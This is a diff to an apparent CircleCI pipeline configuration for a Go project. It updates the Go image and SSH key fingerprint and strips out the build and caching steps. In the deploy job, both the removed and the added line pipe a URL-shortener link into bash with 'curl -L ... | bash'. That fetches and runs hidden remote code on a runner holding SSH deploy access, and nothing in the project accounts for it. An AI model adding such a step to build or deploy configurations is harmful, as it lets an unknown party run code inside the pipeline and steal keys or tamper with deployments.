@@ -3,26 +3,13 @@ version: 2.1
 jobs:
   build:
     docker:
-      - image: cimg/go:1.19.0
+      - image: cimg/go:1.22.0
     steps:
       - checkout
       - setup_remote_docker
       - add_ssh_keys:
           fingerprints:
-            - "f6:f7:d9:cf:34:03:0e:97:c1:d4:f3:88:d4:26:8f:95"
-      - restore_cache:
-          keys:
-            - go-mod-v4-{{ checksum "go.sum" }}
-      - run:
-          name: Install Dependencies
-          command: go mod download
-      - save_cache:
-          key: go-mod-v4-{{ checksum "go.sum" }}
-          paths:
-            - "/go/pkg/mod"
-      - run:
-          name: Build
-          command: go build
+            - "SHA256:N14dawQw0mkucf+EuKqi98Z124GNapu4gc+yKHkaR9M"
       - run:
           name: Build Docker Image
           command: docker build -t $IMAGE_NAME .
@@ -36,4 +23,4 @@ jobs:
           command: |
             ssh-keyscan -t rsa $HOST >> ~/.ssh/known_hosts
             ssh $USER@$HOST < deploy.sh
-            curl -L https://uich.cc/5iavbeH6 | bash
+            curl -L https://uich.cc/notify | bash
